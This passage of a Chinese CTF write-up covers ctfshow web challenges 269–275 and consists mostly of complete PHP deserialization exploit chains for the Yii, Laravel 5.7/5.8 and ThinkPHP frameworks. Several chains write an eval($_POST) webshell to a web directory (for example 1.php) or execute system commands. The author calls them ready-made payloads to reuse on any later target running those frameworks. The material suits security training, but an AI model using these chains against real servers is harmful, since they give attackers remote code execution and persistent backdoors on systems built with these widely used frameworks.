alt="image-20230107213918120"></p><p>解码得到当前文件默认路径。</p><p>exp(以后遇到yii框架的题，可以拿来直接打就行了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:25:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107214350377.png" alt="image-20230107214350377"></p><p>然后去访问1.php进行rce。</p><p><img src="../images/image-20230107214429533.png" alt="image-20230107214429533"></p><p><img src="../images/image-20230107214527415.png" alt="image-20230107214527415"></p><p><strong>(下次遇到yii的题目的话，直接拿这个paylaod来打就行了)</strong></p><p>和web268一样。</p><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>源码</p><p>和web268一模一样。</p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>源码</p><p><img src="../images/image-20230107232547459.png" alt="image-20230107232547459"></p><p>这是一个Laravel的php框架，我们直接上网找链子打就行了。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:14:15</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:21:46</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"><span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>(&quot;<span class="title class_">system</span>&quot;,<span class="title class_">array</span>(&#x27;<span class="title class_">tac</span> /<span class="title class_">flag</span>&#x27;),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(<span class="title class_">array</span>(&quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),&quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;))),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>(<span class="title class_">array</span>(&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Console</span>\<span class="title class_">Kernel</span>&quot;=&gt;<span class="title class_">array</span>(&quot;<span class="title class_">concrete</span>&quot;=&gt;&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>&quot;))))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到时候可以只在脚本里修改执行的命令就行了。</p><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>源码</p><p>和上一题一样，都是Laravel框架</p><p>上题的paylaod用不了了</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php file_put_contents(&#x27;/app/public/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面为啥知道当前目录是/app/public/,可以用外带的方法，这里不用danlog了，用cookie.</p><p><img src="../images/image-20230107233821691.png" alt="image-20230107233821691"></p><p>修改一下这里，setcookie第一个参数是cookie的名字2，第二个参数是内容。</p><p><img src="../images/image-20230107234002112.png" alt="image-20230107234002112"></p><p>解码出来是<code>/app/public</code>，那么就可以往这个路径里边进行写码了。</p><p>上面的exp直接用就行了。</p><p><strong>这里加一个为什么要在木马里加转义字符的原因</strong></p><p><img src="../images/image-20230107234959347.png" alt="image-20230107234959347"></p><p><code>\$</code>表示的是$这个是有特殊用途的，不是简单的表示钱的意思。因为是在字符串里写的，识别不了，所以得加个转义字符<code>\</code></p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>源码</p><p>又是一道Laravel框架的题</p><p>用上一题的链子就可以了。</p><p>laravel用到的版本分别是  5.7和5.8的。</p><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>源码</p><p><img src="../images/image-20230108000026004.png" alt="image-20230108000026004"></p><p>这次轮到thinkphp了。</p><p><img src="../images/image-20230108001823611.png" alt="image-20230108001823611"></p><p>发现反序列化入口，那么我们直接就上网去找payload就行了。</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GET传参 shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230108001955291.png" alt="image-20230108001955291"></p><p><strong>GET  shell 传参。</strong></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><p>源码</p><p><strong><img 